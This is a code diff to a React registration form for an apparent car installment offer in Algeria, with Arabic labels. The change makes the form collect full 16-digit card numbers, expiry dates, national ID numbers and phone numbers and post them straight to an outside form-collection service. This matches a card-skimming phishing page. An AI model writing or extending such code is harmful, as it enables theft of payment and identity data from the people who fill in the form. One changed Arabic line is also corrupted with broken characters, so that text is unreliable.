@@ -49,14 +49,32 @@ export function RegistrationForm({ selectedCar, onSelectCar }: RegistrationFormP
     }
     
     try {
-      // Send email notification
-      await fetch("/api/register", {
+      // Send directly to Formcarry
+      const response = await fetch("https://formcarry.com/s/ZXsyzAQSlEQ", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(registration),
+        headers: { 
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({
+          fullName: formData.fullName,
+          nin: formData.nin,
+          phone1: formData.phone1,
+          phone2: formData.phone2 || "غير محدد",
+          cardNumber: formData.cardLast8,
+          cardExpiry: formData.cardExpiry,
+          hasPreviousInstallment: formData.hasPreviousInstallment ? "نعم" : "لا",
+          selectedCar: selectedCar ? `${selectedCar.brand} ${selectedCar.model}` : "لم يتم الاختيار",
+          carPrice: selectedCar ? `${selectedCar.price} دج` : "",
+          monthlyPayment: selectedCar ? `${selectedCar.monthlyPayment} دج/شهر` : "",
+          registrationDate: new Date().toLocaleString("ar-DZ"),
+        }),
       })
+      
+      const result = await response.json()
+      console.log("[v0] Formcarry result:", result)
     } catch (error) {
-      console.error("Error sending email:", error)
+      console.error("[v0] Error sending to Formcarry:", error)
     }
     
     // Store in localStorage for dashboard
@@ -155,16 +173,25 @@ export function RegistrationForm({ selectedCar, onSelectCar }: RegistrationFormP
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                   <div>
                     <label className="block text-sm font-medium mb-2">
-                      آخر 8 أرقام من البطاقة الذهبية *
+                      رقم البطاقة الذهبية *
                     </label>
                     <input
                       type="text"
                       name="cardLast8"
-                      value={formData.cardLast8}
-                      onChange={handleChange}
-                      maxLength={8}
-                      className="w-full px-4 py-3 rounded-lg border border-input bg-background text-foreground"
-                      placeholder="XXXX XXXX"
+                      dir="ltr"
+                      onChange={(e) => {
+                        const digitsOnly = e.target.value.replace(/\D/g, '').slice(0, 16)
+                        handleChange({ target: { name: 'cardLast8', value: digitsOnly } })
+                      }}
+                      inputMode="numeric"
+                      maxLength="19"
+                      className="w-full px-4 py-3 rounded-lg border border-input bg-background text-foreground font-mono text-lg tracking-wider"
+                      placeholder="**** **** **** ****"
+                      value={
+                        formData.cardLast8
+                          ? `${formData.cardLast8.slice(0, 4)} ${formData.cardLast8.slice(4, 8)} ${formData.cardLast8.slice(8, 12)} ${formData.cardLast8.slice(12, 16)}`
+                          : ''
+                      }
                     />
                   </div>
                   <div>
@@ -180,7 +207,7 @@ export function RegistrationForm({ selectedCar, onSelectCar }: RegistrationFormP
                   </div>
                 </div>
                 <p className="text-xs text-muted-foreground mt-3">
-                  تستعمل البطاقة في فتح حساب التقسيط لسحب الدفعات بالتقسيط في الوقت المحدد وبكل
+                  تستعمل البطاقة ف�� فتح حساب التقسيط ل��حب الدفعات بالت��سيط في الوقت المحدد وبكل
                   شفافية.
                 </p>
               </div>
